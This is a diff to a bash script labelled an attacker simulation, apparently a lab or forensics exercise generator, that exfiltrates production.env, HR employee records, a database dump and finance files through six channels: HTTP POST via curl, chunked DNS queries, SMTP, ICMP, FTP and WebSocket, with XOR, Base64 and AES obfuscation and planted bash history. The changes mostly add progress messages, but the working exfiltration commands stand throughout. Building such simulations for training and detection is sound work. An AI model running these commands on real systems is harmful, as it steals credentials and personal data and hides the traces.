@@ -14,12 +14,20 @@ open(b,'wb').write(bytes(x^k[i%len(k)] for i,x in enumerate(d)))
 PY
 }
 
-benign(){ "$ROOT/victim/benign_activity.sh" || true; sleep 1; }
+benign(){ echo "    [benign activity...]" && "$ROOT/victim/benign_activity.sh" || true; sleep 1; }
 hist(){ cat >>/root/.bash_history; }
+
+echo "============================================"
+echo "  Six Ways Out — Attacker Simulation"
+echo "  Victim: $(hostname)"
+echo "  Time:   $(date -u)"
+echo "============================================"
 
 # ======================================================================
 # 0. Initial benign activity
 # ======================================================================
+echo ""
+echo "[0/6] Initial benign activity..."
 
 hist <<'EOF'
 cd /var/www
@@ -46,6 +54,8 @@ benign
 #    XOR with mango-47 -> Base64 -> HTTP POST
 #    Key recovered via: printf 'bWFuZ28tNDc=' | base64 -d
 # ======================================================================
+echo ""
+echo "[1/6] HTTP exfiltration (production.env -> $HTTP_IP)..."
 
 hist <<'EOF'
 ls -lah /opt/app/config
@@ -55,16 +65,22 @@ wc -c /tmp/.u1
 sha256sum /tmp/.u1
 printf 'bWFuZ28tNDc=' | base64 -d > /tmp/.k1
 EOF
+echo "  XOR encoding..."
 xor_file /opt/app/config/production.env /tmp/.u1.xor "$HTTP_KEY"
+echo "  Base64 encoding..."
 base64 -w0 /tmp/.u1.xor >/tmp/.u1.b64
+echo "  HTTP POST to $HTTP_IP..."
 curl -sS -X POST "http://$HTTP_IP/api/update" --data-binary @/tmp/.u1.b64 >/dev/null 2>&1 || true
 rm -f /tmp/.u1.xor /tmp/.u1.b64
+echo "  [✓] HTTP exfiltration complete"
 benign
 
 # ======================================================================
 # 2. DNS exfiltration — employee_records.csv
 #    Base32 -> 30-char chunks -> DNS queries to explicit DNS server
 # ======================================================================
+echo ""
+echo "[2/6] DNS exfiltration (employee_records.csv -> $DNS_IP)..."
 
 hist <<'EOF'
 ls -lah /opt/hr
@@ -79,18 +95,27 @@ dig +short metrics.internal.example
 dig +short logging.internal.example
 cat /etc/resolv.conf
 EOF
+echo "  Base32 encoding..."
 python3 -c "import base64; open('/tmp/.b32','w').write(base64.b32encode(open('/opt/hr/employee_records.csv','rb').read()).decode())"
+echo "  Sending DNS queries..."
+count=0
 while read -r x; do
   dig +short "$x.$DNS_DOMAIN" @"$DNS_IP" >/dev/null 2>&1 || true
+  count=$((count+1))
+  [ $((count % 10)) -eq 0 ] && echo "    $count queries sent..."
   sleep .15
 done < <(fold -w 30 /tmp/.b32)
+echo "  Total: $count DNS queries sent"
 rm -f /tmp/.b32
+echo "  [✓] DNS exfiltration complete"
 benign
 
 # ======================================================================
 # 3. SMTP exfiltration — QR code PNGs via email
 #    Three emails with real QR PNG MIME attachments
 # ======================================================================
+echo ""
+echo "[3/6] SMTP exfiltration (QR codes via email -> $SMTP_IP)..."
 
 hist <<'EOF'
 printf '%s\n' 'Monthly reconciliation completed.' > /tmp/note
@@ -98,7 +123,9 @@ mailq
 python3 /opt/smtp_sender.py --smtp-host 203.0.113.25
 mailq
 EOF
+echo "  Sending 3 QR-coded emails..."
 python3 "$ROOT/attacker/smtp_sender.py" --smtp-host "$SMTP_IP" --recipient "$SMTP_RECIPIENT" || true
+echo "  [✓] SMTP exfiltration complete"
 benign
 
 # ======================================================================
@@ -106,6 +133,8 @@ benign
 #    XOR with raven-19 -> hex -> chunks -> ICMP Echo Requests
 #    Key recovered via: printf 'cmF2ZW4tMTk=' | base64 -d
 # ======================================================================
+echo ""
+echo "[4/6] ICMP exfiltration (db.dump -> $ICMP_IP)..."
 
 hist <<'EOF'
 printf 'cmF2ZW4tMTk=' | base64 -d > /tmp/.k4
@@ -116,18 +145,22 @@ wc -c /tmp/.hex
 head -c 64 /tmp/.hex
 ping -c 1 192.0.2.91
 EOF
-# XOR the source file with the key, then hex-encode
+echo "  XOR encoding..."
 xor_file /var/backups/db.dump /tmp/.u4.xor "$ICMP_KEY"
+echo "  Hex encoding..."
 xxd -p /tmp/.u4.xor | tr -d '\n' > /tmp/.hex
-# Send via Scapy-based ICMP sender
+echo "  Sending ICMP packets..."
 python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 || true
 rm -f /tmp/.u4.xor
+echo "  [✓] ICMP exfiltration complete"
 benign
 
 # ======================================================================
 # 5. FTP exfiltration — q3_forecast.xlsx
 #    gzip -> Base64 -> FTP upload
 # ======================================================================
+echo ""
+echo "[5/6] FTP exfiltration (q3_forecast.xlsx -> $FTP_IP)..."
 
 hist <<'EOF'
 ls -lah /opt/finance
@@ -138,15 +171,20 @@ base64 -w0 /tmp/.gz > /tmp/.u5
 wc -c /tmp/.u5
 ftp -inv 203.0.113.88
 EOF
+echo "  Compressing and encoding..."
 gzip -c /opt/finance/q3_forecast.xlsx >/tmp/.gz
 base64 -w0 /tmp/.gz >/tmp/.u5
 if command -v ftp >/dev/null; then
+echo "  Uploading via FTP..."
 ftp -inv "$FTP_IP" <<EOF || true
 user $FTP_USER $FTP_PASSWORD
 binary
 put /tmp/.u5 daily_metrics.dat
 bye
 EOF
+echo "  [✓] FTP exfiltration complete"
+else
+echo "  [!] ftp command not found, skipping"
 fi
 benign
 
@@ -155,6 +193,8 @@ benign
 #    AES-256-CBC + PBKDF2 + salt -> Base64 -> WebSocket
 #    Password recovered via: printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d
 # ======================================================================
+echo ""
+echo "[6/6] WebSocket exfiltration (release-notes.txt -> $WS_IP:8080)..."
 
 hist <<'EOF'
 cat /srv/app/releases/release-notes.txt > /tmp/.u6
@@ -164,9 +204,12 @@ openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /tmp/.u6 -out /tm
 ls -lh /tmp/.u6.enc
 base64 -w0 /tmp/.u6.enc
 EOF
+echo "  Encrypting with AES-256-CBC..."
 printf '%s' "$WS_PASSWORD" > /tmp/.k6
 openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /srv/app/releases/release-notes.txt -out /tmp/.u6.enc
+echo "  Sending via WebSocket..."
 python3 "$ROOT/attacker/websocket_client.py" --url "ws://$WS_IP:8080/exfil" --file /tmp/.u6.enc || true
+echo "  [✓] WebSocket exfiltration complete"
 
 # ======================================================================
 # Cleanup
@@ -185,4 +228,9 @@ free -m
 uptime
 logout
 EOF
-echo "[+] simulation complete"
+echo ""
+echo "============================================"
+echo "  Simulation Complete!"
+echo "  All 6 exfiltration channels executed."
+echo "  Time: $(date -u)"
+echo "============================================"
